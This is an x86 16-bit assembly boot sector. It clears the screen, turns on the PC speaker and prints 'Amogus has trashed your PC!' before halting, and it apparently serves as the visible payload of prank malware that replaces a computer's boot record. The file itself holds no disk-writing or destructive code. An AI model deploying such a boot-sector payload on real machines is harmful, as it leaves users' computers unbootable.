    BITS  16
    ORG   0x7c00
    GLOBAL main

main:
    mov ah, 0x06
    mov al, 0
    int 10h

    mov al, 0x06
    in al, 61h
    or al, 00000011b
    out 61h, al

    xor ax, ax        ; AX = 0
    mov ds, ax        ; DS = 0
    mov bx, 0x7c00

    cli               ; Turn off interrupts for SS:SP update
                      ; to avoid a problem with buggy 8088 CPUs
    mov ss, ax        ; SS = 0x0000
    mov sp, bx        ; SP = 0x7c00
                      ; We'll set the stack starting just below
                      ; where the bootloader is at 0x0:0x7c00. The
                      ; stack can be placed anywhere in usable and
                      ; unused RAM.
    sti               ; Turn interrupts back on

    mov SI, loadMsg
    call print

    cli
.endloop:
    hlt
    jmp .endloop      ; When finished effectively put our bootloader
                      ; in endless cycle

print:
    pusha
.loop:
    mov AL, [SI]      ; No segment on [SI] means implicit DS:[SI]
    cmp AL, 0
    je .end
    call printChar
    inc SI
    jmp .loop
.end:
    popa
    ret

printChar:
    pusha
    mov AH, 0x0E
    mov BH, 0
    mov BL, 0x0F
    int 0x10
    popa
    ret

; Place the Data after our code
loadMsg db "Amogus has trashed your PC!",0xA,0xD,0xA,0xD,"Made by TheAirBlow",0

times 510 - ($ - $$) db 0   ; padding with 0 at the end
dw 0xAA55                   ; PC boot signature